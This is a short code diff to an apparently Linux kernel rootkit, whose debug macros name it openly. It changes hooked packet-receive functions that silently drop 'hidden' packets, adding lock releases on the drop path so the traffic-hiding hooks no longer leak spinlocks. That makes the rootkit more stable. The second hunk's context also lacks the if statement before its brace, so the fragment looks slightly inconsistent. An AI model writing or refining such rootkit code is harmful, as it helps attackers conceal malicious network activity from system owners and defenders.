@@ -160,7 +160,8 @@ manipulated_packet_rcv (struct sk_buff* skb, struct net_device* dev, struct pack
 	/* check if we need to hide this packet */	
 	if(is_packet_hidden(skb))
 	{	
-		ROOTKIT_DEBUG("Dropped a packet in 'packet_rcv'.\n"); 
+		ROOTKIT_DEBUG("Dropped a packet in 'packet_rcv'.\n");
+		spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);
 		return 0; 
 	}
 
@@ -185,6 +186,7 @@ manipulated_tpacket_rcv (struct sk_buff* skb, struct net_device* dev, struct pac
 	/* check if we need to hide this packet */	
 	{	
 		ROOTKIT_DEBUG("Dropped a packet in 'tpacket_rcv'.\n"); 
+		spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);
 		return 0; 
 	}
 
@@ -208,7 +210,8 @@ manipulated_packet_rcv_spkt (struct sk_buff* skb, struct net_device* dev, struct
 	if(is_packet_hidden(skb))
 	/* check if we need to hide this packet */	
 	{	
-		ROOTKIT_DEBUG("Dropped a packet in 'packet_rcv_spkt'.\n"); 
+		ROOTKIT_DEBUG("Dropped a packet in 'packet_rcv_spkt'.\n");
+		spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
 		return 0; 
 	} 
 
